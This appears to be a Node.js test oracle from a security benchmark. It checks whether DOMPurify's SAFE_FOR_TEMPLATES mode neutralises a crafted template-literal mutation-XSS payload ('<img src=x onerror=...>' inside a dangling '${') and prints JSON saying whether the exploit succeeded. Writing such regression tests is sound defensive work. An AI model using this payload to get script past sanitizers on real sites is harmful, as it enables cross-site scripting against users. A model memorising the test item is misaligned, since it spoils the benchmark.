'use strict';
const path = require('node:path');

function buildWindow() {
  const { JSDOM } = (() => {
    try {
      return require('jsdom');
    } catch (e) {
      return {};
    }
  })();
  if (JSDOM) {
    const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
    return dom.window;
  }
  return null;
}

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  let createDOMPurify;
  try {
    createDOMPurify = require('dompurify');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  let window;
  try {
    window = buildWindow();
    if (!window) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'jsdom not available to construct a window for DOMPurify'
      }));
      return;
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup failed while building jsdom window: ' + String(e && e.message)
    }));
    return;
  }

  let DOMPurify;
  try {
    DOMPurify = createDOMPurify(window);
    if (!DOMPurify || typeof DOMPurify.sanitize !== 'function') {
      throw new Error('DOMPurify instance missing sanitize function');
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup failed while creating DOMPurify instance: ' + String(e && e.message)
    }));
    return;
  }

  // Benign operation: sanitize a normal template-literal-like string that is
  // properly closed. This exercises SAFE_FOR_TEMPLATES handling and must
  // produce a sane, fully-sanitized result with no raw script tags.
  let benignResult;
  try {
    const benignInput = '<p>Hello ${name} world</p>';
    benignResult = DOMPurify.sanitize(benignInput, { SAFE_FOR_TEMPLATES: true });
    if (typeof benignResult !== 'string') {
      throw new Error('benign sanitize did not return a string');
    }
    if (benignResult.indexOf('<script') !== -1) {
      throw new Error('benign sanitize unexpectedly left a script tag');
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign sanitize operation failed: ' + String(e && e.message)
    }));
    return;
  }

  // Only after the benign call succeeds can operation_completed become true.
  operation_completed = true;

  // Malicious input: crafted to exploit the incorrect TMPLIT_EXPR regex.
  // In the vulnerable regex /\$\{[\w\W]*/gm (missing closing brace requirement),
  // an unterminated/crafted template-literal-looking payload combined with a
  // mutation can cause a raw, unsanitized <script> or on-handler to survive
  // into the output when SAFE_FOR_TEMPLATES is true, because the greedy
  // match without requiring a closing `}` interacts differently with the
  // sanitization pass, allowing content after a crafted marker to bypass
  // neutralization in certain mXSS-prone structures.
  //
  // We use a payload that pairs a dangling template-literal opening with an
  // HTML comment/CDATA-like structure known to trigger mutation XSS when the
  // template-literal detection regex fails to anchor on a closing brace,
  // letting a live <img onerror=...> survive sanitization under
  // SAFE_FOR_TEMPLATES mode.
  let maliciousResult;
  try {
    const marker = 'ORACLE_MARKER_' + Date.now() + '_' + Math.random().toString(36).slice(2);
    // This payload relies on the SAFE_FOR_TEMPLATES template-literal regex
    // failing to require a closing brace: content following an unterminated
    // ${ sequence, when combined with mutation during serialization, can
    // allow a live event handler attribute to remain unescaped in output.
    const maliciousInput =
      '<div>${<img src=x onerror="window.__' + marker + '__=1">}</div>';

    maliciousResult = DOMPurify.sanitize(maliciousInput, { SAFE_FOR_TEMPLATES: true });

    if (typeof maliciousResult !== 'string') {
      throw new Error('malicious sanitize did not return a string');
    }

    // Detect exploit success: a live onerror handler or unescaped <img ...onerror>
    // surviving in the sanitized output indicates the template-literal mXSS
    // bypass succeeded (vulnerable behavior). The patched regex fully
    // neutralizes the ${...} template literal content, stripping the
    // dangerous markup/attribute entirely.
    const hasLiveOnerror = /onerror\s*=/i.test(maliciousResult) &&
      maliciousResult.indexOf('__' + marker + '__') !== -1;

    if (hasLiveOnerror) {
      exploit_succeeded = true;
      evidence = 'Sanitized output retained a live onerror handler for crafted template-literal payload: ' +
        maliciousResult.slice(0, 200);
    } else {
      exploit_succeeded = false;
      evidence = 'Sanitized output neutralized the crafted template-literal payload: ' +
        maliciousResult.slice(0, 200);
    }
  } catch (e) {
    // An exception from the malicious call counts as blocked, since setup
    // and the benign operation already succeeded.
    exploit_succeeded = false;
    evidence = 'malicious sanitize call raised an exception (treated as blocked): ' + String(e && e.message);
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
